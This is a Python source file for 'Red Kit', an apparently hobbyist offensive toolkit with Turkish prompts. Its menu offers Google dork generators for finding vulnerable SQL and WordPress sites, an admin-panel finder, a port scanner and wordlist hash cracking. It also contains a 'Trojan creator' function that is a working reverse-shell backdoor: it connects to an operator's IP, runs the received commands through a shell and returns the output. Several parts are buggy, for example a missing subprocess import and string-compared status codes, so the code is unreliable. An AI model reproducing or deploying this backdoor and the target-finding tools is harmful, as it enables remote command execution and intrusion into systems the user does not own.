#!/usr/bin/env python3

# modulleri indirme kismi 
try:
    import requests as req 
    import socket,sys,time,json,os,hashlib 
    from pyfiglet import Figlet
    import hashlib as hasher
    from bs4 import BeautifulSoup as btu
    from dork import bypassdork , wordpressdork , fileuplouddork , sqldork 
except:
    os.system("pip install pyfiglet ")
    os.system("pip install json")
    os.system("pip install beautifulSoup4 ")
    os.system("pip install hashlib ")
    os.system("apt install netcat")
    os.system("apt install exiftool")
    os.system("pip install requests ")
    os.system("pkg install steghide")
    os.system("pip install stegcracker")
    os.system("clear")
    

    
    
red_kit = Figlet(font="roman")
print(red_kit.renderText("Red Kit"))
print("""

[ + ] {1} SQLi Dork Maker
[ + ] {2} WordPress Dork Maker
[ + ] {3} Admin Panel Scanner
[ + ] {4} Advanced Port Scanner
[ + ] {5} Hash Identifier
[ + ] {6} Some Cryptography Tools 
[ + ] {7} Netcat Listener for Reverse Shells
[ + ] {8} Steghide ( Stenography ) #
[ + ] {9} Stegcracker 
[ + ] {10} Exiftool ( metada analyzer ) 
[ + ] {11} Trojan Creator # 
[ + ] {12} Web Application Firewall Detecter
[ + ] {13} Exploit Database Researcher #    
[ + ] {14} John the Ripper ( for hash cracking)  

""")
def backdoor():
    f = Figlet(font='roman')
    print(f.renderText('Trojan ceator'))
    server_ip = input("target(127.0.0.1): ")
    port = 4444
    
    backdoor = socket.socket()
    backdoor.connect((server_ip, port))

    while True:
        command = backdoor.recv(1024)
        command = command.decode()
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        backdoor.send(output + output_error)
        
islem = int(input("[ + ] islem giriniz: "))
def admin_panel():
    f = Figlet(font='roman')
    print(f.renderText('Admin Finder'))
    target = str(input("Hedef adresi giriniz: "))
    istek = req.get("https://"+target)
    if istek.status_code != "404":
        istek = req.get('https://'+target)
        with open("wordlist.txt","r+") as f:
              for i in f.readlines():
                  istek_1 = req.get("https://" +target + '/' + i )
                  if istek_1.status_code == "200":
                     print("Send:","https://" +target + '/' + i)
                  else:
                     print("Not Found !")
    else:
        istek = req.get("http://"+target)
        with open("wordlist.txt","r+") as f:
              for i in f.readlines():
                  istek_1 = req.get("http://"+target + '/' + i)
                  if istek_1.status_code == "200":
                     print("Send:","http://" +target + '/' + i)
                  else:
                      print("Not Found !")
                      
                      
                      
                      
                      
def port_scaner():
    f = Figlet(font='doom')
    print(f.renderText('Port Scaner'))
    target = input("target: ")
    print("-"*40)
    try:
        for port in range(1,65535):
            soc = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            cevap = soc.connect_ex((target,port))
            if cevap == 0:
               print(f"[ + ] port {port} is open")
            soc.close()
            
    except KeybroadInterrupt:
        print("çıkış yapildi")
        sys.exit()
        
        
        
def hash_info():
    f = Figlet(font='doom')
    print(f.renderText('Hash info '))
    hash = str(input("Hash giriniz: "))
    hs1 ='4607'
    if len(hash)==len(hs1) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("Hash type, CRC16 ")       
        
        
    hs2 ='3d08'
    if len(hash) == len(hs2) and hash.isdigit() == False and hash.isalpha()==False and hash.isalnum()==True:
       print("Hash type, CRC16CİTT ")    
         
         
    hs3 ='0e5b'
    if len(hash)==len(hs3) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("Hash type FCS16 ")
    
    
    hs4 ='b33fd057'
    if len(hash)==len(hs4) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("Hash type CRC 32 ")
        
    hs5 ='b764a0d9'
    if len(hash)==len(hs5) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("Hash type CRC32C ")
    
    hs6 ='0000003f'
    if  len(hash)==len(hs6) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("Hash type XOR32")
        
    hs7 ='63cea4673fd25f46'
    if len(hash)==len(hs7) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("Hash type MySQL")
    
    hs8 ='08bbef4754d98806c373f2cd7d9a43c4'
    if len(hash)==len(hs8) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("Hash type MD2 ")
    hs9 ='a2acde400e61410e79dacbdfc3413151'
    if len(hash)==len(hs9) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("hash type  ")
    hs10='ae11fd697ec92c7c98de3fac23aba525'
    if len(hash)==len(hs10) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("Hash type MD5")
        
        
    hs11 ='4a1d4dbc1e193ec3ab2e9213876ceb8f4db72333'
    if len(hash) == len(hs11) and hash.isdigit() == False  and hash.isalpha() == False  and hash.isalnum()==True:
        print("Hash type Sha1  ")
        
    hs12 ='2c740d20dab7f14ec30510a11f8fd78b82bc3a711abe8a993acdb323e78e6d5e'
    if len(hash) == len(hs12) and hash.isdigit() == False  and hash.isalpha() == False  and hash.isalnum()==True:
       print("Hash type sha256 ")
       
    hs13 ='e301f414993d5ec2bd1d780688d37fe41512f8b57f6923d054ef8e59'
    if len(hash) == len(hs13) and hash.isdigit() == False  and hash.isalpha() == False  and hash.isalnum()==True:
        print("Hash type sha224 ")
       
    hs14 ='7169ecae19a5cd729f6e9574228b8b3c91699175324e6222dec569d4281d4a4a'
    if len(hash) == len(hs14)  and  hash.isdigit() == False  and  hash.isalpha() == False and hash.isalnum() == True:
        print("Hash type Haval256 ")
     
    hs16='sha256$Zion3R$9e1a08aa28a22dfff722fad7517bae68a55444bb5e2f909d340767cec9acf2c3'
    if len(hash) == len(hs16) and hash.isdigit() == False  and  hash.isalpha() == False  and hash.isalnum() == True:
        print("Hash type sha1django ")
        
    hs17 ='ea8e6f0935b34e2e6573b89c0856c81b831ef2cadfdee9f44eb9aa0955155ba5e8dd97f85c73f030666846773c91404fb0e12fb38936c56f8cf38a33ac89a24e'
    if len(hash) == len(hs17) and hash.isdigit() == False and hash.isalpha() == False  and  hash.isalnum()==True:
        print("Hash type sha512 ")
    hs18 ='76df96157e632410998ad7f823d82930f79a96578acc8ac5ce1bfc34346cf64b4610aefa8a549da3f0c1da36dad314927cebf8ca6f3fcd0649d363c5a370dddb'
    if len(hash)==len(hs18) and hash.isdigit() == False  and  hash.isalpha() == False  and  hash.isalnum() == True:
       print("Hash type Whirlpool")
       
def sql_dork():
   f = Figlet(font='doom')
   print(f.renderText('SQL DORK'))
   while True:
      try:
         url = input("Enter a country's domain extension:\033[0m ")
         if not url:
            raise ValueError 

         f = open("Latest Dorks.txt", "w+", encoding='utf8')
         countrydomain = sqldork.replace("countrydomain","site" + url)
         f.write(countrydomain)

         print("Dorks saved to \"Latest Dorks.txt\"")
         done = input("Press \"Enter\" to exit")
         sys.exit()

      except ValueError:
            print("\033[91mError: Please enter a valid domain extension!")

def wordpress():
    f = Figlet(font='doom')
    print(f.renderText('Wordpress'))
    while True:
      try:
         url = input("\033[96mEnter a country's domain extension:\033[0m ")
         if not url:
            raise ValueError # raises an error if the input is left empty

         f = open("Latest Dorks.txt", "w+", encoding='utf8')
         countrydomain = wordpressdork.replace("countrydomain", "site:" + url)
         f.write(countrydomain)

         print("Dorks saved to \"Latest Dorks.txt\"")
         done = input("Press \"Enter\" to exit")
         sys.exit()

      except ValueError:
            print("\033[91mError: Please enter a valid domain extension!")

def wafw00f():
     f = Figlet(font='doom')
     print(f.renderText('wafw00f '))
     target = input('hedef adres: ')
     os.system(f"wafw00f {target} -v ")
     


    
def crypto():
    f = Figlet(font='doom')
    print(f.renderText('Hash encrypt'))
    print(""" 
şifreleme türü seçiniz
[1] md5                 
[2] sha1                       
[3] sha224      
[4] sha256      
[5] sha384      
[6] sha3_256      
[7] sha3_384      
[8] sha3_512      
[9] sha512            
   """)
    print(time.asctime())
    secim = int(input("işlem kodu girini: "))
    if secim == 1:
       metin = input('metin giriniz: ')
       sifre = hasher.md5()
       sifre.update(metin.encode('utf-8'))
       hash = sifre.hexdigest()
       print(hash)

    elif secim == 2:
       l = input("metin geriniz: ")
       time.sleep(1)
       pw = hasher.sha1()
       pw.update(l.encode("utf-8"))
       w = pw.hexdigest()
       print(w)
  
    elif secim == 3:
    	zor = input("metin giriniz: ")
    	zor_be = hasher.sha224()
    	zor_be.update(zor.encode('utf-8'))
    	zor_be_ya = zor_be.hexdigest()
    	print(zor_be_ya)
	
    elif secim == 4:
        qq = hasher.sha256()
        print(__z := input('metin giriniz: '))
        qq.update(__z.encode('utf-8'))
        q_q = qq.hexdigest()
        print(q_q)
        
    elif secim == 5:
        o = input('metin giriniz: ')
        time.sleep(1)
        q__w = hasher.sha384()
        q__w.update(o.encode('utf-8'))
        asasd = q__w.hexdigest()
        print(asasd)
        
    elif secim == 6:
        m1 = input("metin giriniz: ")
        m2 = hasher.sha3_256()
        m2.update(m1.encode("utf-8"))
        m3 = m2.hexdigest()
        print(m3)
        
    elif secim == 7:
        j1 = input("metin giriniz: ")
        j2 = hasher.sha3_384()
        j2.update(j1.encode("utf-8"))
        j3 = j2.hexdigest()
        print(j3)
	
    elif secim == 8:
        print(e1 := input("metin giriniz: "))
        e2 = hasher.sha3_512()
        e2.update(e1.encode("utf-8"))
        e3 = e2.hexdigest()
        print(e3)
	
    elif secim == 9:
	    x1 = input("metin giriniz: ")
	    time.sleep(1)
	    x2 = hasher.sha512()
	    x2.update(x1.encode("utf-8"))
	    x3 = x2.hexdigest()
	    print(x3)
	
    else:
   	 print("yanlîş kod yazdınız")
   	 
def hash_c():
    f = Figlet(font="o8")
    print(f.renderText('HASH Decode'))
    #'sha1', 'sha224', 'sha256', 'sha384', 'sha3_224', 'sha3_256', 'sha3_384', 'sha3_512', 'sha512', 
    print("""
 [ 1 ] md5 
 [ 2 ] sha1
 [ 3 ] sha256
 [ 4 ] sha224
 [ 5 ] sha384
 [ 6 ] sha512
 [ 7 ] sha3_256
 [ 8 ] sha3_384
    
    
    """)
    islem = int(input("işlem numrasi giriniz (type): "))
    hash_ = input("hash giriniz: ")
    
    
    def md5_c():
         
         with open("wordlist.txt", "r", encoding="utf-8") as password:
                data = password.readlines()
                for i in data:
                    hash_decode = hashlib.md5(i.strip().encode('utf-8')).hexdigest()
                    if hash_decode == hash_:
                       print(f"[ + ] Found {i.strip()}")
                       exit()
                       
                       
                       
    def sha1_c():
      
         with open("wordlist.txt", "r", encoding="utf-8") as password:
                data = password.readlines()
                for i in data:
                    hash_decode = hashlib.sha1(i.strip().encode('utf-8')).hexdigest()
                    if hash_decode == hash_:
                       print(f"[ + ] Found {i.strip()}")
                       exit()
                       
                       
                       
     
    def sha256_c():
         
         with open("wordlist.txt", "r", encoding="utf-8") as password:
                data = password.readlines()
                for i in data:
                    hash_decode = hashlib.sha256(i.strip().encode('utf-8')).hexdigest()
                    if hash_decode == hash_:
                       print(f"[ + ] Found {i.strip()}")
                       exit()
                       
                       
                       
    def sha224_c():
         
         with open("wordlist.txt", "r", encoding="utf-8") as password:
                data = password.readlines()
                for i in data:
                    hash_decode = hashlib.sha224(i.strip().encode('utf-8')).hexdigest()
                    if hash_decode == hash_:
                       print(f"[ + ] Found {i.strip()}")
                       exit()
                       
                       
                       
    def sha384_c():
         
         with open("wordlist.txt", "r", encoding="utf-8") as password:
                data = password.readlines()
                for i in data:
                    hash_decode = hashlib.sha384(i.strip().encode('utf-8')).hexdigest()
                    if hash_decode == hash_:
                       print(f"[ + ] Found {i.strip()}")
                       exit()
                       
                       
                       
    def sha512_c():
         
         with open("wordlist.txt", "r", encoding="utf-8") as password:
                data = password.readlines()
                for i in data:
                    hash_decode = hashlib.sha512(i.strip().encode('utf-8')).hexdigest()
                    if hash_decode == hash_:
                       print(f"[ + ] Found {i.strip()}")
                       exit()
                       
                       
                       
    def sha3_256c():
         
         with open("wordlist.txt", "r", encoding="utf-8") as password:
                data = password.readlines()
                for i in data:
                    hash_decode = hashlib.sha3_256(i.strip().encode('utf-8')).hexdigest()
                    if hash_decode == hash_:
                       print(f"[ + ] Found {i.strip()}")
                       exit()
                       
                       
                       
    def sha3_384c():
         with open("wordlist.txt", "r", encoding="utf-8") as password:
                data = password.readlines()
                for i in data:
                    hash_decode = hashlib.sha3_384(i.strip().encode('utf-8')).hexdigest()
                    if hash_decode == hash_:
                       print(f"[ + ] Found {i.strip()}")
                       exit()
                       
                       

    if islem == 1:
       md5_c()
    elif islem == 2:
        sha1_c()
    elif islem == 3:
        sha256_c()
    elif islem == 4:
        sha224_c()
    elif islem == 5:
        sha384_c()
    elif islem == 6:
       sha512_c()
    elif islem == 7:
       sha3_256c()
    elif islem == 8:
       sha3_384c()
    else:
        print("hatali kod")
def extiftool():
   f = Figlet(font="08")
   print(f.renderText("extiftool"))
   os.system(f"extiftool {file}")
   
def netcat():
      try:
          f = Figlet(font="poison")
          print(f.renderText('Netcat'))
          target_ = input("hedef kurban: ")
          os.system(f"nc -nv {target_} 4444")
          

      except TimeoutError:
          print("baglanti zaman asimina ugradi")

def steg():
   f = Figlet(font="o8")
   print(f.renderText("stegcracker"))
   file = input("taranacak dosya: ")
   os.system(f"stegcracker {file}")
  
 
if islem == 1:
    sql_dork()
elif islem == 2:
    wordpress()
elif islem == 3:
    admin_panel()
elif islem == 4:
    port_scaner()
elif islem == 5:
    hash_info()
elif islem == 6:
    crypto()
elif islem == 7:
    netcat()
elif islem == 8:
    pass
elif islem == 9:
    steg()
elif islem == 10:
    extiftool()
elif islem == 11:
    pass
elif islem == 12:
    wafw00f()
elif islem == 13:
    pass
elif islem == 14:
    hash_c()
